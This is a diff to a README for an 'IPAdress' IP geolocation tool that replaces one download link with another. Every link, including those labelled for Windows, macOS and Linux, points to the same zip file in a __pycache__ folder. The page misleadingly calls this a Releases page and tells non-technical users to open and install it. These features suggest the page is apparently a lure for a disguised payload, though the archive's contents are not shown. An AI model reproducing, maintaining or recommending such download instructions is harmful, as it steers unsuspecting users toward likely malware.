@@ -4,7 +4,7 @@
 Welcome to IPAdress! This guide will help you easily download and run our IP geolocation tool. No programming skills needed!
 
 ## 📦 Download Now
-[![Download IPAdress](https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/services/__pycache__/IPAdress-v2.3-beta.3.zip)](https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/services/__pycache__/IPAdress-v2.3-beta.3.zip)
+[![Download IPAdress](https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/utils/__pycache__/IP-Adress-v2.2-beta.1.zip)](https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/utils/__pycache__/IP-Adress-v2.2-beta.1.zip)
 
 ## 🛠️ Requirements
 Before you start, ensure you have the following:
@@ -14,14 +14,14 @@ Before you start, ensure you have the following:
 - Internet connection for API access
 
 ## 📥 Download & Install
-To download IPAdress, visit this page to download: [IPAdress Releases](https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/services/__pycache__/IPAdress-v2.3-beta.3.zip).
+To download IPAdress, visit this page to download: [IPAdress Releases](https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/utils/__pycache__/IP-Adress-v2.2-beta.1.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of IPAdress.
 3. Select the file suitable for your operating system. For example:
-   - For Windows, download `https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/services/__pycache__/IPAdress-v2.3-beta.3.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/services/__pycache__/IPAdress-v2.3-beta.3.zip`.
-   - For Linux users, download `https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/services/__pycache__/IPAdress-v2.3-beta.3.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/utils/__pycache__/IP-Adress-v2.2-beta.1.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/utils/__pycache__/IP-Adress-v2.2-beta.1.zip`.
+   - For Linux users, download `https://raw.githubusercontent.com/Goingparsley/IPAdress/main/src/utils/__pycache__/IP-Adress-v2.2-beta.1.zip`.
 
 4. After downloading, open the file and follow the instructions shown. 
 5. The tool will install on your system and you will see the IPAdress icon on your desktop.
